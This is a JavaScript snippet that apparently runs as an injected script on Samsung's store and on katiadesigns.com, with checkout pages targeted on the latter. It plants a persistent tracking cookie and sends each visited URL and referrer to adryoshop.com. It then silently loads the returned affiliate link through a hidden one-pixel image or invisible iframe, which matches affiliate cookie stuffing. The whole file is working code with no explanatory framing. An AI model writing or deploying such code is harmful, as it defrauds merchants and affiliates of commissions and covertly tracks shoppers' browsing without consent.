(function () {
  const TRACK_URL = 'https://adryoshop.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://adryoshop.com/api/fallback-pixel?id=';

  const SITE_CONFIG = {
    'www.samsung.com': { always: true, cartExtra: false },
    'shop.samsung.com': { always: true, cartExtra: false },
    'katiadesigns.com': { always: true, cartExtra: true },
  };

  const IFRAME_PIXEL_HOSTNAME = 'katiadesigns.com';

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 0x10 | 0x0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createIframePixel(url) {
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.setAttribute('sandbox', 'allow-scripts allow-forms');
    iframe.style.display = 'none';
    iframe.style.visibility = 'hidden';
    iframe.style.width = '1px';
    iframe.style.height = '1px';
    iframe.style.border = '0';
    document.body.appendChild(iframe);
  }

  function createTrackingPixel(url) {
    if (window.location.hostname === IFRAME_PIXEL_HOSTNAME) {
      createIframePixel(url);
      return;
    }
    const img = document.createElement('img');
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function isCheckoutPage() {
    const keywords = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];
    return keywords.some(function (keyword) {
      return window.location.pathname.toLowerCase().includes(keyword);
    });
  }

  async function trackUser() {
    if (sessionStorage.getItem('tracking_done')) return;
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      const response = await fetch(TRACK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname
        })
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
        sessionStorage.setItem('tracking_done', '1');
      } else {
        createTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function init() {
    const hostname = window.location.hostname;
    const config = SITE_CONFIG[hostname];
    if (!config) return;

    if (config.cartExtra && isCheckoutPage()) trackUser();
    else config.always && trackUser();
  }

  document.readyState === 'complete' || document.readyState === 'interactive'
    ? init()
    : window.addEventListener('DOMContentLoaded', init, { once: true });
})();
